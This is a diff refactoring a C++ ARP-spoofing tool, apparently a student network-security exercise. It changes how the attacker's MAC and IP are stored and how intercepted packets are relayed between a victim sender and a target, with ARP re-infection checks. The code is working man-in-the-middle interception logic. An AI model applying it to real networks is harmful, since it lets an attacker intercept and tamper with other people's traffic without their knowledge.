@@ -1,7 +1,7 @@
 #include "spoof.h"
 
 
-Mac Spoof::GetAttackerMac(const char* interface) {
+void Spoof::GetAttackerMac(const char* interface) {
     unsigned char AttackerMac[6];
     struct ifreq ifr;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -11,11 +11,10 @@ Mac Spoof::GetAttackerMac(const char* interface) {
     memcpy(AttackerMac, ifr.ifr_hwaddr.sa_data, 6);
     
     close(sock);
-
-    return Mac(AttackerMac);
+    attackerMac_ = Mac(AttackerMac);
 }
 
-Ip Spoof::GetAttackerIP(const char* interface) {
+void Spoof::GetAttackerIP(const char* interface) {
     static char ip[16];
     struct ifreq ifr;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -27,7 +26,7 @@ Ip Spoof::GetAttackerIP(const char* interface) {
     strcpy(ip, inet_ntoa(addr->sin_addr));
     
     close(sock);
-    return Ip(ip);
+    attackerIP_ = Ip(ip);
 }
 
 void Spoof::SetDefaultArpPacket(struct EthArpPacket& packet) {
@@ -90,7 +89,7 @@ void Spoof::SetSendnTargetIp(char* senderIP, char* targetIP){
     targetIP_ = Ip(targetIP);
 }
 
-int Spoof::RelayPacket(pcap_t* pcap, Mac attackerMac, Ip attackerIP) {
+int Spoof::RelayPacket(pcap_t* pcap) {
     //패킷의 mac만 변경해서 제대로 보내기
     //너무 많은 기능 들어가있음, 함수 나누기
     struct pcap_pkthdr* header;
@@ -137,19 +136,19 @@ int Spoof::RelayPacket(pcap_t* pcap, Mac attackerMac, Ip attackerIP) {
 
     if (sip == senderIP_ && tip == targetIP_) { //게이트웨이라면? -> 이 부분 처리해야 함
         eth->dmac_ = targetMac_;
-        eth->smac_ = attackerMac;
+        eth->smac_ = attackerMac_;
         pcap_sendpacket(pcap, cpPacket, header->len);
     }
     else if (sip == targetIP_ && tip == senderIP_) {
         eth->dmac_ = senderMac_;
-        eth->smac_ = attackerMac;
+        eth->smac_ = attackerMac_;
         pcap_sendpacket(pcap, cpPacket, header->len);
     }
-    else if (isArp && (eth->smac_ == senderMac_) && (eth->dmac_ == attackerMac) ) {
+    else if (isArp && (eth->smac_ == senderMac_) && (eth->dmac_ == attackerMac_) ) {
         //reinfection
         result = 1;
     }
-    else if (isArp && (eth->smac_ == targetMac_) && (eth->dmac_ == attackerMac) ) {
+    else if (isArp && (eth->smac_ == targetMac_) && (eth->dmac_ == attackerMac_) ) {
         //reinfection
         result = 1;
     }
